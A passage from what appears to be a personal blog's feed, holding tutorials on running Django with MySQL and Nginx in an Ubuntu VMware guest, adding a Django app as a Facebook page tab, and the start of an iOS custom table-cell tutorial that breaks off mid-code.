class="line">)</span><br></pre></td></tr></table></figure><p>Edit the <strong>index.html</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="comment">&lt;!-- load the function --&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/styles.css&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>The special date is </span><span class="template-variable">&#123;&#123; <span class="name">special_date</span>|date:<span class="string">&#x27;F j, Y&#x27;</span> &#125;&#125;</span><span class="language-xml">.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="Integrate-to-Facebook"><a href="#Integrate-to-Facebook" class="headerlink" title="Integrate to Facebook"></a>Integrate to Facebook</h2><p><strong>Assumed that you already have an App in Facebook as well as a Facebook Page</strong></p><p>Configure the setting</p><p><img src="/images/posts/2013-04-01-create-facebook-page-app-using-django-with-nginx/facebook-app-setting.png" alt="facebook setting"></p><p><strong>Remember to check both <em>Website with Facebook Login</em> and <em>Page Tab</em></strong></p><p>Then add the app to your Facebook Page by type in the URL <strong><a href="https://www.facebook.com/dialog/pagetab?app_id=YOUR_APP_ID&amp;next=YOUR_URL">https://www.facebook.com/dialog/pagetab?app_id=YOUR_APP_ID&amp;next=YOUR_URL</a></strong></p><p>Congrat!!! You successfully added your app to Facebook Page.</p><p>References:</p><ul><li><em><a href="http://www.akadia.com/services/ssh_test_certificate.html">How to create a self-signed SSL Certificate …</a></em></li><li><em><a href="http://www.redrobotstudios.com/blog/2010/02/06/requiring-https-for-certain-paths-in-django/">Requiring https for certain paths in Django</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;This is continue from &lt;a href=&quot;/blog/2013/03/29/setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/&quot;&gt;previous post&lt;/a&gt;.&lt;/p&gt;
&lt;h2</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
    <category term="django" scheme="http://jslim.net/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Setup Django/mysql in Ubuntu server in VMWare Fusion</title>
    <link href="http://jslim.net/blog/2013/03/29/setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/"/>
    <id>http://jslim.net/blog/2013/03/29/setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/</id>
    <published>2013-03-29T09:00:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Basically the goal is <strong>To create a web application that run on VMWare using Python/Django with MySql, and able to accessed by the host OS.</strong></p><p><strong>Note: This is tested on Ubuntu Server 12.04 LTS, the host OS is Mac OS X mountain lion.</strong></p><h2 id="Configure-your-guess-OS-which-the-web-server-is-to-be-run-later"><a href="#Configure-your-guess-OS-which-the-web-server-is-to-be-run-later" class="headerlink" title="Configure your guess OS which the web server is to be run later"></a>Configure your guess OS which the web server is to be run later</h2><p>Assumed that the instance is clean <em>(which doesn’t install anything other than the OS)</em></p><p>Install all the necessary package</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install <span class="keyword">python</span>-pip mysql-server <span class="keyword">python</span>-mysqldb nginx</span><br></pre></td></tr></table></figure><ul><li><code>python-pip</code> is to install <strong>Django</strong> and <strong>flup</strong></li><li><code>mysql-server</code> &amp; <code>python-mysqldb</code> is required to run <strong>Django</strong> with <strong>MySql</strong></li><li><code>nginx</code> is a reverse proxy server that used to redirect the <strong>HTTP Request</strong> from <strong>port 80</strong> <em>(default port)</em> to <strong>port 8000</strong> <em>(Django default port, you can change to any port number)</em></li></ul><p>Now install <strong>Django</strong> and <strong>flup</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip <span class="keyword">install</span> Django==<span class="number">1.5</span>.<span class="number">1</span></span><br><span class="line">$ pip <span class="keyword">install</span> flup</span><br></pre></td></tr></table></figure><p>Create a user for database</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQ<span class="class">L monitor.  Commands end with ;</span><span class="built_in"> or </span>\g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.29-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2012, Oracle<span class="built_in"> and/or </span>its affilliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation<span class="built_in"> and/or </span>its</span><br><span class="line">affilliates. Other names may be trademarks of their respective owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27;<span class="built_in"> or </span>&#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@localhost [(none)]&gt; CREATE DATABASE django_db;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@localhost [(none)]&gt; GRANT ALL ON django_db.* TO &#x27;username&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;</span><br><span class="line">Query OK, 0 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">root@localhost [(none)]&gt; exit</span><br></pre></td></tr></table></figure><p>This basically is create a new database <strong>django_db</strong> and a new user <strong>username</strong> with password <strong>password</strong>. And grant all permissions to <strong>username</strong> on <strong>django_db</strong>.</p><p>Start a new project</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> ~/public_html <span class="comment"># This is optional</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/public_html</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">django-admin.py startproject projectname</span></span><br></pre></td></tr></table></figure><p>Edit the file <strong>~/public_html/projectname/projectname/settings.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;django_db&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;username&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Create an app to this project</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/public_html/projectname/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python manage.py startapp newapp</span></span><br></pre></td></tr></table></figure><p>Edit the file <strong>~/public_html/projectname/newapp/models.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(models.Model):</span><br><span class="line">    <span class="built_in">id</span> = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    first_name = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line">    last_name = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line">    created_date = models.DateTimeField()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py <span class="keyword">sql</span> newapp</span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `newapp_user` (</span><br><span class="line">    `id` <span class="type">integer</span> AUTO_INCREMENT <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    `first_name` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `last_name` <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `created_date` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">)</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><p>This is just a preview without actually create a table on your database.<br>Thus, you have to run this</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">python</span> manage.<span class="keyword">py</span> syncdb</span><br></pre></td></tr></table></figure><p>To verify it</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p django_db</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.29-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2012, Oracle and/or its affilliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affilliates. Other names may be trademarks of their respective owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root<span class="meta">@localhost</span> [(django_db)]&gt; desc newapp_user;</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field        </span>|<span class="string"> Type        </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id           </span>|<span class="string"> int(11)     </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> first_name   </span>|<span class="string"> varchar(30) </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> last_name    </span>|<span class="string"> varchar(30) </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> created_date </span>|<span class="string"> datetime    </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+--------------+-------------+------+-----+---------+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root<span class="meta">@localhost</span> [(none)]&gt; exit</span><br></pre></td></tr></table></figure><p>Now configure Nginx to the django project</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-available/</span>django.conf <span class="comment"># create a new file</span></span><br></pre></td></tr></table></figure><p>with this content</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name test.local.domain;</span><br><span class="line">    access_log <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/logs/</span>access.log;</span><br><span class="line">    error_log <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/logs/</span>error.log;</span><br><span class="line"></span><br><span class="line">    location <span class="regexp">/static/</span> &#123;</span><br><span class="line">        alias <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/static/</span>;</span><br><span class="line">        expires <span class="number">30</span>d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location <span class="regexp">/media/</span> &#123;</span><br><span class="line">        alias <span class="regexp">/home/u</span>sername<span class="regexp">/public_html/</span>projectname<span class="regexp">/media/</span>;</span><br><span class="line">        expires <span class="number">30</span>d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        fastcgi_pass <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span>;</span><br><span class="line">        fastcgi_split_path_info ^()(.*)$;</span><br><span class="line">        include <span class="regexp">/etc/</span>nginx/fastcgi_params;</span><br><span class="line">        fastcgi_param PATH_INFO <span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        fastcgi_pass_header Authorization;</span><br><span class="line">        fastcgi_intercept_errors off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Remember to create a <strong>logs</strong> directory in <strong>~/public_html/projectname/</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> ~/public_html/projectname/logs</span></span><br></pre></td></tr></table></figure><p>Start your Nginx server</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="regexp">/etc/i</span>nit.d/nginx start</span><br></pre></td></tr></table></figure><p>Run your project on Nginx</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/public_html/projectname</span><br><span class="line">$ python manage.py runfcgi <span class="keyword">method</span>=<span class="title function_">threaded</span> <span class="title function_">host</span>=127.0.0.1 <span class="title function_">port</span>=8000</span><br></pre></td></tr></table></figure><p>Now your server is run on background.</p><h2 id="Go-back-to-your-host-OS"><a href="#Go-back-to-your-host-OS" class="headerlink" title="Go back to your host OS"></a>Go back to your host OS</h2><p>Configure your network setting for the instance that run the web application</p><p><img src="/images/posts/2013-03-29-setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/guess-os-network.png" alt="Network setting"></p><p><strong>NOTE: This must be in LAN environment, so that the router assign a new ip for your guess OS</strong></p><h2 id="To-get-your-Guess-OS’s-ip-have-to-go-back-to-guess-OS"><a href="#To-get-your-Guess-OS’s-ip-have-to-go-back-to-guess-OS" class="headerlink" title="To get your Guess OS’s ip, have to go back to guess OS"></a>To get your Guess OS’s ip, have to go back to guess OS</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig</span><br><span class="line">eth0      <span class="keyword">Link</span> encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">11</span>:<span class="number">22</span>:<span class="number">33</span>:<span class="number">44</span>:<span class="number">55</span></span><br><span class="line">          inet addr:<span class="number">192.168</span><span class="number">.1</span><span class="number">.123</span> Bcast:<span class="params">...</span><span class="params">...</span>.</span><br></pre></td></tr></table></figure><p>Here you want is <strong>192.168.1.123</strong></p><h2 id="Now-configure-your-host-OS"><a href="#Now-configure-your-host-OS" class="headerlink" title="Now configure your host OS"></a>Now configure your host OS</h2><p>Add a host <em>(local domain)</em></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure><p>add a new line to the bottom</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.1.123</span>    local.mysite.com</span><br></pre></td></tr></table></figure><p>You can just put whatever name you want.</p><p>Open up your favourite browser and type in the URL<br><strong>local.mysite.com</strong> and you should be able to see the page below</p><p><img src="/images/posts/2013-03-29-setup-django-slash-mysql-in-ubuntu-server-in-vmware-fusion/django-welcome-page.png" alt="Welcome page"></p><p>Enjoy :)</p><p>References:</p><ul><li><em><a href="http://www.saltycrane.com/blog/2008/07/how-set-django-mysql-ubuntu-hardy/">How to set up Django with MySql on Ubuntu Hardy</a></em></li><li><em><a href="http://www.alrond.com/en/2007/mar/01/start-django-with-nginx/">Start django with nginx</a></em></li><li><em><a href="https://code.djangoproject.com/wiki/ServerArrangements#nginx">Server arrangements</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Basically the goal is &lt;strong&gt;To create a web application that run on VMWare using Python/Django with MySql, and able to accessed by the</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
    <category term="django" scheme="http://jslim.net/tags/django/"/>
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
    <category term="vmware" scheme="http://jslim.net/tags/vmware/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Create UITableView with custom cell programmatically</title>
    <link href="http://jslim.net/blog/2013/03/22/ios-create-uitableview-with-custom-cell-programmatically/"/>
    <id>http://jslim.net/blog/2013/03/22/ios-create-uitableview-with-custom-cell-programmatically/</id>
    <published>2013-03-22T10:59:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Personally, I don’t like to use Xcode’s interface builder. I felt that everything programmatically will be easier to debug.</p><p>This post is share about create table view and custom table cell.</p><p>Create custom cell</p><p><strong>JSCustomCell.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// extends UITableViewCell</span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">JSCustomCell</span> : <span class="title">UITableViewCell</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// now only showing one label, you can add more yourself</span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">UILabel</span> *descriptionLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>JSCustomCell.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;JSCustomCell.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">JSCustomCell</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@synthesize</span> descriptionLabel = _descriptionLabel;</span><br><span class="line"></span><br><span class="line">- (<span class="type">id</span>)initWithStyle:(<span class="built_in">UITableViewCellStyle</span>)style reuseIdentifier:(<span class="built_in">NSString</span> *)reuseIdentifier</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">self</span> = [<span class="variable language_">super</span> initWithStyle:style reuseIdentifier:reuseIdentifier];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="comment">// configure control(s)</span></span><br><span class="line">        <span class="keyword">self</span>.descriptionLabel = [[<span class="built_in">UILabel</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">5</span>, <span class="number">10</span>, <span class="number">300</span>, <span class="number">30</span>)];</span><br><span class="line">        <span class="keyword">self</span>.descriptionLabel.textColor = [<span class="built_in">UIColor</span> blackColor];</span><br><span class="line">        <span class="keyword">self</span>.descriptionLabel.font = [<span class="built_in">UIFont</span> fontWithName:<span class="string">@&quot;Arial&quot;</span> size:<span class="number">12.0</span>f];</span><br><span class="line">        </span><br><span class="line">        [<span class="keyword">self</span> addSubview:<span class="keyword">self</span>.descriptionLabel];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>JSViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tell the compiler to conform to these protocols</span></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">JSViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UITableViewDelegate</span>, <span class="title">UITableViewDataSource</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>JSViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;JSViewController.h&quot;</span></span></span><br><span class="line"><span class="meta">#import <span class="string">&quot;JSCustomCell.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">JSViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">JSViewController</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UITableView</span> *tableView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    <span class="comment">// init table view</span></span><br><span class="line">    tableView = [[<span class="built_in">UITableView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds style:<span class="built_in">UITableViewStylePlain</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// must set delegate &amp; dataSource, otherwise the the table will be empty and not responsive</span></span><br><span class="line">    tableView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    tableView.dataSource = <span class="keyword">self</span>;</span><br><span class="line"></span><br><span class="line">    tableView.backgroundColor = [<span class="built_in">UIColor</span> cyanColor];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add to canvas</span></span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:tableView];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UITableViewDataSource</span></span><br><span class="line"><span class="comment">// number of section(s), now I assume there is only 1 section</span></span><br><span class="line">- (<span class="built_in">NSInteger</span>)numberOfSectionsInTableView:(<span class="built_in">UITableView</span> *)theTableView</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// number of row in the section, I assume there is only 1 row</span></span><br><span class="line">- (<span class="built_in">NSInteger</span>)tableView:(<span class="built_in">UITableView</span> *)theTableView numberOfRowsInSection:(<span class="built_in">NSInteger</span>)section</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span 